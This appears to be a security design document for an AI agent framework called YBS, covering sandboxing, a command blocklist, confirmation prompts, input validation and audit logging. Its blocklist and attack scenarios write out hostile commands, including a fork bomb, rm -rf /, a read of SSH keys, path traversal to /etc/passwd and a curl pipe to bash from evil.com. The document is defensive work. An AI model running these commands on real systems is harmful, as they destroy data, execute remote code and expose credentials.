# Security Model

**Version**: 0.1.0
**Last Updated**: 2026-01-17

📍 **You are here**: YBS Framework > Documentation > Security Model
**↑ Parent**: [Documentation Hub](README.md)
📚 **Related**: [tool-architecture.md](tool-architecture.md) | [bootstrap-principles.md](bootstrap-principles.md)

> **Canonical Reference**: This is the single source of truth for YBS security model.
> All other documents should link here rather than duplicating this content.

---

## Overview

Systems built with YBS implement **security by default** - safety mechanisms are enabled automatically, not opt-in. This applies particularly to tool execution, especially shell commands and file operations.

**Core principle**: Restrict first, allow selectively.

---

## Security Layers

### 1. Path Sandboxing

**Purpose**: Restrict file operations to allowed directories

**How it works**:
- File operations (read, write, edit, list, search) check paths against allow-list
- Deny-by-default: Only explicitly allowed paths are accessible
- Symbolic link resolution: Prevent escaping via symlinks
- Path traversal prevention: Block `../` attempts to escape sandbox

**Default allowed paths** (example from bootstrap):
```
Allowed:
- Current working directory and subdirectories
- /tmp and /var/tmp (temporary files)
- User-specified project directories

Blocked:
- ~/.ssh (SSH keys)
- ~/.aws (AWS credentials)
- ~/.config (sensitive configuration)
- /etc (system configuration)
- /System, /Library (macOS system files)
```

**Configuration**:
```json
{
  "security": {
    "allowed_paths": [
      "{{CWD}}",
      "/tmp",
      "~/projects/myapp"
    ],
    "blocked_paths": [
      "~/.ssh",
      "~/.aws",
      "~/.config"
    ]
  }
}
```

---

### 2. Shell Sandboxing

**Purpose**: Restrict shell command execution to safe operations

**How it works** (macOS bootstrap implementation):
- All shell commands run via `sandbox-exec` with restrictive profile
- Sandbox profile: Deny-by-default, allow specific operations
- File access: Limited to allowed paths
- Network: Blocked by default (unless explicitly enabled)
- Process operations: Limited (no fork bombs, no ptrace)

**Example sandbox profile** (macOS `.sb` format):
```scheme
(version 1)
(deny default)

; Allow reading from allowed paths
(allow file-read* (subpath "/tmp"))
(allow file-read* (subpath "/Users/username/projects"))

; Allow writing to allowed paths
(allow file-write* (subpath "/tmp"))

; Block network
(deny network*)

; Block sensitive directories
(deny file-read* (subpath "/Users/username/.ssh"))
(deny file-read* (subpath "/Users/username/.aws"))
```

**Platform-specific**:
- **macOS**: `sandbox-exec` (kernel-enforced)
- **Linux**: bubblewrap, firejail, or seccomp-bpf (future)
- **Windows**: Job objects or AppContainer (future)

---

### 3. Command Blocklist

**Purpose**: Prevent obviously dangerous commands

**Blocked commands**:
- `rm -rf /` - Delete entire filesystem
- `sudo` - Privilege escalation
- `chmod 777` - Overly permissive file permissions
- `chmod -R 777` - Recursive permission destruction
- `mkfs` - Format disk
- `dd if=/dev/zero` - Overwrite data
- `:(){:|:&};:` - Fork bomb
- `curl ... | bash` - Execute remote code

**How it works**:
- Parse command before execution
- Check against blocklist patterns
- Reject immediately (don't even attempt sandbox)
- Log blocked attempts for audit

**Bypass**: User can override via explicit confirmation dialog (per-command)

---

### 4. User Confirmation

**Purpose**: Require explicit approval for destructive operations

**Confirmation required for**:
- `write_file` - Creating or modifying files
- `run_shell` - Executing any shell command
- `edit_file` - Applying edits (optional, configurable)
- File deletion operations
- Operations outside allowed paths (if override requested)

**Confirmation UI** (example):
```
⚠️  CONFIRMATION REQUIRED

Action: write_file
Path:   /Users/username/projects/myapp/config.json
Size:   1.2 KB

Preview:
{
  "api_key": "sk-...",
  ...
}

Options:
[A] Allow once
[S] Allow for this session
[D] Deny
[V] View full content

Choice:
```

**Session allow-list**:
- User can approve a tool for the current session
- Not persisted across sessions (deliberate)
- Reduces confirmation fatigue for repeated operations
- Cleared when agent exits

---

### 5. Input Validation

**Purpose**: Validate tool parameters before execution

**What's validated**:
- Paths: Check for path traversal attempts
- File extensions: Reject unexpected types (optional)
- Command syntax: Parse before execution
- JSON structure: Validate external tool output
- Size limits: Reject excessively large operations

**Example validations**:
```swift
// Path validation
func validatePath(_ path: String) throws {
    guard !path.contains("../") else {
        throw SecurityError.pathTraversal
    }
    guard allowedPaths.contains(where: { path.hasPrefix($0) }) else {
        throw SecurityError.pathNotAllowed
    }
}

// Command validation
func validateCommand(_ cmd: String) throws {
    for blocked in blockedCommands {
        if cmd.contains(blocked) {
            throw SecurityError.commandBlocked(blocked)
        }
    }
}
```

---

## Attack Scenarios & Mitigations

### Scenario 1: LLM Tries to Read SSH Keys

**Attack**:
```
LLM: read_file("/Users/username/.ssh/id_rsa")
```

**Mitigation**:
- Path sandboxing blocks `~/.ssh`
- Operation fails with clear error
- Logged for audit

**Result**: ✅ Prevented

---

### Scenario 2: LLM Tries to Execute Malicious Command

**Attack**:
```
LLM: run_shell("curl http://evil.com/malware.sh | bash")
```

**Mitigation**:
- Command blocklist catches `curl ... | bash` pattern
- Operation rejected before sandbox execution
- User sees warning

**Result**: ✅ Prevented

---

### Scenario 3: LLM Tries Path Traversal

**Attack**:
```
LLM: read_file("../../../../../../etc/passwd")
```

**Mitigation**:
- Path resolution detects traversal attempt
- Normalized path checked against sandbox
- Operation fails

**Result**: ✅ Prevented

---

### Scenario 4: LLM Tries to Overwrite Important File

**Attack**:
```
LLM: write_file("Makefile", "rm -rf /\n")
```

**Mitigation**:
- User confirmation required for `write_file`
- User sees preview of content
- User can deny the operation

**Result**: ✅ User decision (informed)

---

## Configuration Options

### Strictness Levels

**Paranoid** (maximum security):
```json
{
  "security": {
    "level": "paranoid",
    "require_confirmation": ["read_file", "write_file", "edit_file", "run_shell"],
    "allow_network": false,
    "allow_external_tools": false
  }
}
```

**Balanced** (default):
```json
{
  "security": {
    "level": "balanced",
    "require_confirmation": ["write_file", "run_shell"],
    "allow_network": false,
    "allow_external_tools": true
  }
}
```

**Permissive** (for trusted environments):
```json
{
  "security": {
    "level": "permissive",
    "require_confirmation": [],
    "allow_network": true,
    "allow_external_tools": true
  }
}
```

---

## Audit Logging

**What's logged**:
- All tool executions (success and failure)
- All confirmation dialogs (allowed, denied, session)
- All security violations (blocked commands, path denials)
- Timestamps and command details

**Log location** (bootstrap example):
```
~/.config/ybs/logs/security.log
```

**Log format**:
```
2026-01-17T08:00:00Z [SECURITY] [ALLOWED] write_file: /Users/user/project/file.txt
2026-01-17T08:00:05Z [SECURITY] [BLOCKED] read_file: /Users/user/.ssh/id_rsa (path not allowed)
2026-01-17T08:00:10Z [SECURITY] [CONFIRMED] run_shell: npm test (session allow-list)
```

---

## Security Checklist

When implementing a system with YBS, ensure:

- [ ] Path sandboxing implemented and tested
- [ ] Shell sandboxing enabled (platform-specific)
- [ ] Command blocklist configured
- [ ] User confirmation UI implemented
- [ ] Input validation on all tool parameters
- [ ] Audit logging enabled
- [ ] Sensitive directories blocked by default
- [ ] Network access denied by default (unless needed)
- [ ] External tools validated before execution
- [ ] Session allow-lists not persisted
- [ ] Security settings documented
- [ ] Tested against common attack scenarios

---

## References

- **Bootstrap spec**: [../specs/technical/ybs-spec.md](../specs/technical/ybs-spec.md) Section 8 (Security)
- **Architectural decision**: [../specs/architecture/ybs-decisions.md](../specs/architecture/ybs-decisions.md) D09 (Sandboxing)
- **Implementation checklist**: [../specs/general/ybs-lessons-learned.md](../specs/general/ybs-lessons-learned.md) Section 4 (Safety)
- **Tool architecture**: [tool-architecture.md](tool-architecture.md)

---

**Version History**:
- 0.1.0 (2026-01-17): Initial canonical reference extracted from distributed documentation
